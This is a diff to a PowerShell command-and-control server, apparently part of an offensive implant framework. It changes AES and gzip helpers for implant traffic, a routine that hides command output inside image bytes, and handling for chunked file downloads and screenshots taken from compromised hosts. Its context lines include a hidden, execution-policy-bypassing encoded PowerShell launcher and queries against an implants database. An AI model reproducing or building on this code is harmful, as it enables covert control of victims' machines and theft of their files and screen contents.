@@ -173,20 +173,19 @@ function Decrypt-String
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
-function Decrypt-String3
-{
-    param
-    (
-        [Object]
-        $key,
-        [Object]
-        $bytes
-    )
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor()
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    $unencryptedData
+function Decrypt-Bytes($key, $bytes) {
+	$IV = $bytes[0..15]
+	$aesManaged = Create-AesManagedObject $key $IV
+	$decryptor = $aesManaged.CreateDecryptor()
+	$byteArray = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+	$input = New-Object System.IO.MemoryStream( , $byteArray ) 
+    $output = New-Object System.IO.MemoryStream
+	$gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	$gzipStream.CopyTo( $output )
+	$gzipStream.Close()
+	$input.Close()
+	[byte[]] $byteOutArray = $output.ToArray() 
+	$byteOutArray
 }
 # download file function to convert from base64 in db to file
 function Download-File
@@ -1104,7 +1103,7 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadclear)
 $payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e "+[Convert]::ToBase64String($bytes)
 $payload = $payloadraw -replace "`n", ""
 
-function getimgdata($cmdoutput) {
+function GetImgData($cmdoutput) {
     $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
     
     try {$image = $icoimage|get-random}catch{}
@@ -1122,25 +1121,16 @@ function getimgdata($cmdoutput) {
     }
     $imageBytes = [Convert]::FromBase64String($image)
     $maxbyteslen = 1500
+    $maxdatalen = 1500 + ($cmdoutput.Length)
     $imagebyteslen = $imageBytes.Length
     $paddingbyteslen = $maxbyteslen - $imagebyteslen
-
-    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
-    $ImagePlusPad = New-Object byte[] $maxbyteslen
-    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
-    $CombinedBytes = $ImagePlusPadBytes.length
-
-    $CmdBytes = $cmdoutput
-    $CmdBytesLen = $CmdBytes.Length
-
-    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
-    $FullBuffer = New-Object byte[] $CombinedByteSize
-
-    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
-    $FullBufferSize = $FullBuffer.length
-    return $FullBuffer
+    $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
+    $ImageBytesFull = New-Object byte[] $maxdatalen    
+    [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
+    [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
+    [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
+    $ImageBytesFull
 }
-
 function Create-AesManagedObject($key, $IV) {
     $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
     $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -1175,12 +1165,18 @@ function Encrypt-String($key, $unencryptedString) {
     #$aesManaged.Dispose()
     [System.Convert]::ToBase64String($fullData)
 }
-function Encrypt-String3($key, $bytes) {
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    $fullData
+function Encrypt-Bytes($key, $bytes) {
+	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+	$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+	$gzipStream.Write( $bytes, 0, $bytes.Length )
+	$gzipStream.Close()
+	$bytes = $output.ToArray()
+	$output.Close()
+	$aesManaged = Create-AesManagedObject $key 
+    $encryptor = $aesManaged.CreateEncryptor() 
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData 
+	$fullData
 }
 function Decrypt-String($key, $encryptedStringWithIV) {
     $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
@@ -1481,20 +1477,25 @@ $message =[Convert]::ToBase64String($Bytes)
             if  ($cookieplaintext.tolower().startswith('download-file'))
             {
                 try {
-                $filebytes = Decrypt-String3 $key $encryptedString
-                $file = $cookieplaintext -replace "download-file ",""
-                $ramdomfilename = Get-RandomURI -Length 5
-                $targetfile = "$global:newdir\downloads\$($file)"
-                
-                $wStream = new-object IO.FileStream $targetfile, ([System.IO.FileMode]::Append), ([IO.FileAccess]::Write), ([IO.FileShare]::Read)
-                $wStream.Write($filebytes, 0, $filebytes.Length)
-                $wStream.Close()
-
-                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
+                    $filebytes = Decrypt-Bytes $key $encryptedString
+                    $file = $cookieplaintext -replace "download-file ",""
+                    $ramdomfilename = Get-RandomURI -Length 5
+                    $targetfile = "$global:newdir\downloads\$($file)"
+                    [int]$chunkNumber = [System.Text.Encoding]::UTF8.GetString($filebytes[0..4])
+                    [int]$totalChunks = [System.Text.Encoding]::UTF8.GetString($filebytes[5..9])
+                    $filebytes = $filebytes[10..($filebytes.Length)]
+                    $wStream = new-object IO.FileStream $targetfile, ([System.IO.FileMode]::Append), ([IO.FileAccess]::Write), ([IO.FileShare]::Read)
+                    $wStream.Write($filebytes, 0, $filebytes.Length)
+                    $wStream.Close()
+                    $backToPlainText = "Downloaded file part $($chunkNumber) of $($totalChunks) : $targetfile 123456<>654321"
+                    if ($null -ne $br -and $br -is [System.IDisposable])
+                    {
+                        $br.Dispose()
+                    }
                 } catch {
-                Echo $error[0]
-                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
-                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
+                    Echo $error[0]
+                    Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
+                    $backToPlainText = "File not downloaded, the size could be too large or the user may not have permissions!"
                 }
             } else {           
                 try {
@@ -1513,20 +1514,20 @@ $message =[Convert]::ToBase64String($Bytes)
                 Add-Type -AssemblyName System.Windows.Forms
                 Add-Type -AssemblyName System.Drawing
                 try{
-                $randomimageid = Get-RandomURI -Length 15
-                $imagepath = "$global:newdir\downloads\$randomimageid.png"
-                #Convert Base64 to Image
-                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
-                $imageBytes = [Convert]::FromBase64String($backToPlainText)
-                $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
-                $ms.Write($imageBytes, 0, $imageBytes.Length)
-                $image = [System.Drawing.Image]::FromStream($ms, $true)
-                $image.Save("$imagepath")
-                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
+                    $randomimageid = Get-RandomURI -Length 15
+                    $imagepath = "$global:newdir\downloads\$randomimageid.png"
+                    #Convert Base64 to Image
+                    $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
+                    $imageBytes = [Convert]::FromBase64String($backToPlainText)
+                    $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
+                    $ms.Write($imageBytes, 0, $imageBytes.Length)
+                    $image = [System.Drawing.Image]::FromStream($ms, $true)
+                    $image.Save("$imagepath")
+                    $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
                 }
                 catch {
-                $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
-                Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
+                    $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
+                    Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                 }
                 $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
             }
@@ -1555,12 +1556,14 @@ $message =[Convert]::ToBase64String($Bytes)
         Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
         Write-Output $request | Out-File $global:newdir\Webserver.log -Append
     }
+
     if ($exe) {
         $buffer = $message
         $exe = $false
     } else {
         [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
     }
+
     $response.ContentLength64 = $buffer.length
     $response.StatusCode = 200
     $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
@@ -1571,18 +1574,19 @@ $message =[Convert]::ToBase64String($Bytes)
     $output.Close()
     $message = $null
     $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$taskiddb" -as PSObject
+
     if ($resultsdb)
     {
-    $ranuri = $resultsdb.RandomURI
-    $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
-    $implanthost = $im_result.User
-    $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
-
+        $ranuri = $resultsdb.RandomURI
+        $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
+        $implanthost = $im_result.User
+        $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
         $taskcompledtime = $resultsdb.TaskID
         Write-Host "Command returned against host:" $im_result.Hostname $im_result.Domain "($taskcompledtime)" -ForegroundColor Green
         Write-Host -Object $resultsdb.Output -ForegroundColor Green
         $taskiddb ++
     }
+
 }
 
 $listener.Stop()
